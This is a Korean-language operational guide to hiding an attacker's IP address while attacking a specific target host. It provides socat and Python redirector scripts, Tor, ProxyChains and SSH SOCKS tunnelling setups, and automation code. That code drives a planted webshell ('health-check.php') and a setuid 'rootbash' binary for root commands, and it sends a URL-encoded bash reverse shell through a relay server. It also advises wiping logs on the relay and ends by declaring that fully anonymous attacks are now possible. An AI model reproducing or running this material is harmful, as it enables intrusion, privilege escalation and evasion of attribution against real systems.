# 🕵️ IP 완전 난독화 가이드

## 문제 상황
- 리버스 쉘 연결 시 공격자 IP가 로그에 그대로 노출됨
- 웹 요청마다 220.121.193.230이 access_log에 기록됨
- **완전한 익명성 필요!**

---

## 🎯 해결 방법 3가지

### 방법 1: SSH 터널 + 리다이렉터 서버 (가장 실용적) ⭐
### 방법 2: Tor + ProxyChains (완전 익명)
### 방법 3: AWS EC2 중간 서버 (VPN 대체)

---

## 🚀 방법 1: 리다이렉터 서버 (권장)

### 개념
```
[공격자 PC] → [중간 서버 (57.181.28.7)] → [타겟 (52.78.221.104)]
     숨김              노출되는 IP                 공격 대상

타겟 로그에는 57.181.28.7만 기록됨!
```

### 1-1. 리다이렉터 서버 설정 (57.181.28.7)

#### SSH 포트 포워딩으로 리버스 쉘 리다이렉트
```bash
# 57.181.28.7 서버에서 실행
ssh -i ~/.ssh/id_rsa ec2-user@57.181.28.7

# 리버스 쉘 리스너를 리다이렉트
# 타겟에서 57.181.28.7:4444로 연결하면 → 내 PC:5555로 포워딩
nohup socat TCP-LISTEN:4444,fork TCP:YOUR_HOME_IP:5555 &

# 또는 SSH 포트포워딩
ssh -R 5555:localhost:5555 -i ~/.ssh/id_rsa ec2-user@57.181.28.7
```

#### 자동 리다이렉터 스크립트
```bash
# 57.181.28.7에 저장: /home/ec2-user/redirector.sh
cat > /home/ec2-user/redirector.sh << 'EOF'
#!/bin/bash
# IP 리다이렉터 서버

ATTACKER_IP="YOUR_HOME_IP"  # 실제 공격자 IP
ATTACKER_PORT="5555"         # 실제 리스너 포트
LISTEN_PORT="4444"           # 타겟이 연결할 포트

echo "[*] Starting redirector..."
echo "[*] Target will connect to: $(hostname -I | awk '{print $1}'):$LISTEN_PORT"
echo "[*] Forwarding to: $ATTACKER_IP:$ATTACKER_PORT"

# socat으로 리다이렉트
while true; do
    socat TCP-LISTEN:$LISTEN_PORT,fork,reuseaddr TCP:$ATTACKER_IP:$ATTACKER_PORT
    sleep 1
done
EOF

chmod +x /home/ec2-user/redirector.sh
```

### 1-2. 공격자 PC 설정

#### 실제 리스너 시작
```bash
# 로컬 PC에서 5555 포트로 리스너
nc -lvnp 5555
```

#### 타겟에서 리버스 쉘 실행
```bash
# 타겟이 57.181.28.7:4444로 연결 (내 IP 노출 안 됨!)
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/57.181.28.7/4444%200>%261'"
```

#### 결과
- 타겟 로그에는 **57.181.28.7**만 기록됨
- 실제 연결은 내 PC(5555)로 포워딩됨
- **완전한 IP 난독화!**

---

## 🧅 방법 2: Tor + ProxyChains (완전 익명)

### 2-1. Tor 설치 및 설정

#### macOS
```bash
brew install tor proxychains-ng

# Tor 설정
cat > /usr/local/etc/tor/torrc << 'EOF'
SOCKSPort 9050
ControlPort 9051
CookieAuthentication 1
EOF

# Tor 시작
brew services start tor

# 확인
curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
```

#### Linux (Ubuntu)
```bash
sudo apt update
sudo apt install tor proxychains4

# Tor 시작
sudo systemctl start tor
sudo systemctl enable tor

# 확인
curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
```

### 2-2. ProxyChains 설정

```bash
# ProxyChains 설정 파일
sudo nano /etc/proxychains.conf

# 마지막에 추가:
[ProxyList]
socks5 127.0.0.1 9050
```

### 2-3. ProxyChains로 명령 실행

```bash
# curl을 Tor를 통해 실행
proxychains4 curl "http://52.78.221.104/health-check.php?x=whoami"

# Python 스크립트를 Tor를 통해 실행
proxychains4 python3 fin/exploits/08_간단_디페이스.py

# 리버스 쉘도 가능 (복잡함)
proxychains4 nc -lvnp 4444
```

### 2-4. Python에서 직접 Tor 사용

```python
#!/usr/bin/env python3
"""
Tor를 통한 익명 공격
"""
import requests

# Tor SOCKS5 프록시
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# 모든 요청이 Tor를 통해 전송됨
TARGET = "http://52.78.221.104"

# IP 확인 (Tor exit node IP가 나옴)
r = requests.get("https://api.ipify.org", proxies=proxies)
print(f"현재 IP: {r.text}")

# 백도어 접근
r = requests.get(f"{TARGET}/health-check.php?x=whoami", proxies=proxies)
print(r.text)
```

### Tor 주의사항
- ⚠️ **매우 느림** (여러 노드를 거침)
- ⚠️ 리버스 쉘은 복잡함 (타겟이 Tor를 통해 연결해야 함)
- ✅ 웹 요청은 완벽하게 익명화

---

## ☁️ 방법 3: AWS EC2 중간 서버 (VPN 대체)

### 3-1. 중간 서버 설정 (57.181.28.7)

#### SSH Dynamic Forwarding (SOCKS 프록시)
```bash
# 로컬 PC에서 실행
ssh -D 8080 -N -i ~/.ssh/id_rsa ec2-user@57.181.28.7

# 이제 localhost:8080이 SOCKS5 프록시로 작동
# 모든 트래픽이 57.181.28.7을 통해 나감
```

#### 프록시를 통한 curl
```bash
# SOCKS5 프록시로 요청
curl --socks5 127.0.0.1:8080 "http://52.78.221.104/health-check.php?x=whoami"
```

#### Python에서 사용
```python
import requests

proxies = {
    'http': 'socks5h://127.0.0.1:8080',
    'https': 'socks5h://127.0.0.1:8080'
}

r = requests.get("http://52.78.221.104/health-check.php?x=whoami", proxies=proxies)
print(r.text)
```

### 3-2. 완전 자동화 스크립트

```python
#!/usr/bin/env python3
"""
AWS 중간 서버를 통한 익명 공격
"""
import requests
import subprocess
import time
import os
from urllib.parse import quote

# 중간 서버 설정
MIDDLE_SERVER = "57.181.28.7"
SSH_KEY = os.path.expanduser("~/.ssh/id_rsa")
PROXY_PORT = 8123

def start_ssh_tunnel():
    """SSH 터널 시작"""
    print(f"[*] SSH 터널 시작: {MIDDLE_SERVER}")
    cmd = f"ssh -D {PROXY_PORT} -N -f -i {SSH_KEY} ec2-user@{MIDDLE_SERVER}"
    subprocess.run(cmd, shell=True)
    time.sleep(2)
    print(f"[✓] SOCKS5 프록시: localhost:{PROXY_PORT}")

def execute_via_proxy(url):
    """프록시를 통해 요청"""
    proxies = {
        'http': f'socks5h://127.0.0.1:{PROXY_PORT}',
        'https': f'socks5h://127.0.0.1:{PROXY_PORT}'
    }

    try:
        r = requests.get(url, proxies=proxies, timeout=10)
        return r.text
    except Exception as e:
        return f"Error: {e}"

def main():
    # SSH 터널 시작
    start_ssh_tunnel()

    # 익명으로 명령 실행
    TARGET = "http://52.78.221.104"
    WEBSHELL = f"{TARGET}/health-check.php"
    ROOTBASH = "/var/www/html/www/uploads/rootbash"

    # 명령 실행
    cmd = f"{ROOTBASH} -p -c 'whoami'"
    url = f"{WEBSHELL}?x={quote(cmd)}"

    result = execute_via_proxy(url)
    print(f"\n[*] 결과:\n{result}")

    print(f"\n[*] 타겟 로그에는 {MIDDLE_SERVER}만 기록됨!")

if __name__ == "__main__":
    main()
```

---

## 🔥 최고 조합: 리다이렉터 + SSH 터널

### 구조
```
[공격자 PC]
    ↓ SSH 터널
[중간서버 57.181.28.7]
    ↓ 리다이렉트
[타겟 52.78.221.104]

공격자 IP 완전 숨김!
```

### 설정

#### 1. 중간 서버에 리다이렉터 배치
```bash
ssh -i ~/.ssh/id_rsa ec2-user@57.181.28.7

# 리다이렉터 스크립트
cat > ~/redirector.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading

def forward(src, dst):
    while True:
        try:
            data = src.recv(4096)
            if not data:
                break
            dst.send(data)
        except:
            break

def handle_client(client_sock, attacker_ip, attacker_port):
    try:
        # 공격자에게 연결
        attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_sock.connect((attacker_ip, attacker_port))

        # 양방향 포워딩
        t1 = threading.Thread(target=forward, args=(client_sock, attacker_sock))
        t2 = threading.Thread(target=forward, args=(attacker_sock, client_sock))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_sock.close()
        attacker_sock.close()

def main():
    ATTACKER_IP = "YOUR_HOME_IP"  # 실제 공격자 IP
    ATTACKER_PORT = 5555
    LISTEN_PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(5)

    print(f"[*] Redirector listening on port {LISTEN_PORT}")
    print(f"[*] Forwarding to {ATTACKER_IP}:{ATTACKER_PORT}")

    while True:
        client_sock, addr = server.accept()
        print(f"[+] Connection from {addr}")
        t = threading.Thread(target=handle_client, args=(client_sock, ATTACKER_IP, ATTACKER_PORT))
        t.start()

if __name__ == "__main__":
    main()
EOF

chmod +x ~/redirector.py
python3 ~/redirector.py &
```

#### 2. 공격자 PC에서 리스너
```bash
nc -lvnp 5555
```

#### 3. 타겟에서 리버스 쉘
```bash
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/57.181.28.7/4444%200>%261'"
```

#### 4. 결과
- 타겟 로그: **57.181.28.7:4444**
- 실제 연결: **내 PC:5555**
- **완벽한 IP 난독화!**

---

## 🛠️ 자동화 스크립트 (통합)

```python
#!/usr/bin/env python3
"""
완전 익명 공격 자동화
"""
import os
import requests
import subprocess
import time
from urllib.parse import quote

MIDDLE_SERVER = "57.181.28.7"
SSH_KEY = "~/.ssh/id_rsa"
TARGET = "http://52.78.221.104"

class AnonymousAttack:
    def __init__(self):
        self.proxy_port = 8123

    def setup_tunnel(self):
        """SSH SOCKS 터널 설정"""
        print("[*] SSH 터널 시작...")
        cmd = f"ssh -D {self.proxy_port} -N -f -i {SSH_KEY} ec2-user@{MIDDLE_SERVER}"
        os.system(cmd)
        time.sleep(2)
        print(f"[✓] SOCKS5: localhost:{self.proxy_port}")

    def get_proxies(self):
        return {
            'http': f'socks5h://127.0.0.1:{self.proxy_port}',
            'https': f'socks5h://127.0.0.1:{self.proxy_port}'
        }

    def execute_command(self, cmd):
        """익명으로 명령 실행"""
        webshell = f"{TARGET}/health-check.php"
        rootbash = "/var/www/html/www/uploads/rootbash"
        full_cmd = f"{rootbash} -p -c '{cmd}'"
        url = f"{webshell}?x={quote(full_cmd)}"

        r = requests.get(url, proxies=self.get_proxies(), timeout=10)
        return r.text

    def check_ip(self):
        """현재 IP 확인"""
        r = requests.get("https://api.ipify.org", proxies=self.get_proxies())
        print(f"[*] 현재 나가는 IP: {r.text}")
        return r.text

def main():
    attack = AnonymousAttack()

    print("="*60)
    print("완전 익명 공격 도구")
    print("="*60)

    # SSH 터널 시작
    attack.setup_tunnel()

    # IP 확인
    attack.check_ip()

    # 명령 실행
    result = attack.execute_command("whoami")
    print(f"\n[*] 명령 결과:\n{result}")

    print("\n[✓] 타겟 로그에는 57.181.28.7만 기록됨!")

if __name__ == "__main__":
    main()
```

---

## 📊 방법 비교

| 방법 | 익명성 | 속도 | 설정 난이도 | 추천 |
|------|--------|------|-------------|------|
| 리다이렉터 서버 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ✅ 최고 |
| Tor | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | 웹 요청만 |
| SSH Tunnel | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | ✅ 간단 |

---

## ⚠️ 주의사항

1. **중간 서버도 로그 남음**
   - 57.181.28.7의 로그도 정리 필요

2. **SSH 터널 유지**
   - 연결이 끊어지면 재연결 필요

3. **완전한 익명성은 불가능**
   - ISP 레벨에서는 추적 가능
   - 법적 문제 시 중간 서버 로그로 추적됨

4. **권장 조합**
   - 리다이렉터 서버 (57.181.28.7)
   - + SSH 터널
   - + Tor (추가 보호)

---

## 🎯 실전 사용법

```bash
# 1. SSH 터널 시작
ssh -D 8080 -N -i ~/.ssh/id_rsa ec2-user@57.181.28.7 &

# 2. 모든 요청을 프록시로
export http_proxy=socks5://127.0.0.1:8080
export https_proxy=socks5://127.0.0.1:8080

# 3. 익명으로 공격
curl "http://52.78.221.104/health-check.php?x=whoami"

# 4. 리버스 쉘은 리다이렉터 사용
# 타겟 로그: 57.181.28.7
# 실제 연결: 내 PC
```

---

**이제 완전히 익명으로 공격 가능합니다!** 🕵️
